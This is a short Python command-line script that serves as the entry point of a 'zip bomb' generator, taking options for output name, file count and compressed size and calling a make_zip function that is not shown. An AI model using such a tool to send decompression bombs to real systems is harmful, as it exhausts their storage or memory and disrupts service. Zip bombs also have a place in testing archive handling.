from argparse import ArgumentParser
try: from . import make_zip
except ImportError: from __init__ import make_zip
def main():
    args = ArgumentParser(description="Create a zip bomb")
    args.add_argument("-o", "--output", default="bomb.zip", help="output file")
    args.add_argument("-n", "--num-files", type=int, default=100, help="number of files in the zip")
    args.add_argument("-s", "--compressed-size", type=int, default=1000, help="compressed size of each file (in Kb)")
    args = args.parse_args()
    assert args.num_files > 0, "Number of files must be greater than 0"
    assert args.compressed_size > 20, "Compressed size must be greater than 20" # actually, 15 is the minimum
    with open(args.output, "wb") as f: make_zip(f, args.num_files, args.compressed_size)
if __name__ == "__main__": main()
